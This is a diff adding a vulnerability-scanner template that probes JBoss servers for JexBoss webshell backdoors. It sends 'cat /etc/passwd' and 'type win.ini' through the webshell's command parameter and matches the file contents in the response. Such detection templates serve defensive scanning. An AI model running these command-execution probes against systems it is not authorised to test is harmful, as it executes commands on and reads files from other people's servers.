@@ -1,0 +1,43 @@
+id: jexboss-backdoor
+
+info:
+  name: JexBoss - Remote Code Execution
+  author: UnkL4b
+  severity: critical
+  description: JexBoss is susceptible to remote code execution via the webshell. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference:
+    - https://us-cert.cisa.gov/ncas/analysis-reports/AR18-312A
+    - https://github.com/joaomatosf/jexboss
+  metadata:
+    verified: true
+    max-request: 8
+  tags: backdoor,jboss,rce,vuln
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jexws/jexws.jsp?ppp={{url_encode('{{command}}')}}"
+      - "{{BaseURL}}/jexws4/jexws4.jsp?ppp={{url_encode('{{command}}')}}"
+      - "{{BaseURL}}/jexinv4/jexinv4.jsp?ppp={{url_encode('{{command}}')}}"
+      - "{{BaseURL}}/jbossass/jbossass.jsp?ppp={{url_encode('{{command}}')}}"
+
+    payloads:
+      command:
+        - "cat /etc/passwd"
+        - "type C:\\/Windows\\/win.ini"
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "X-Powered-By: Servlet"
+# digest: 4b0a00483046022100e8da5572d70996504225248e8dd7fa2e93676ae568cdba0d61c94d3d9fe4c2a2022100adaaf282cf41bb170bd53dfd35a67cbb7c8df294d9ba87cd27353e5bd24ec54a:922c64590222798bb761d5b6d8e72950
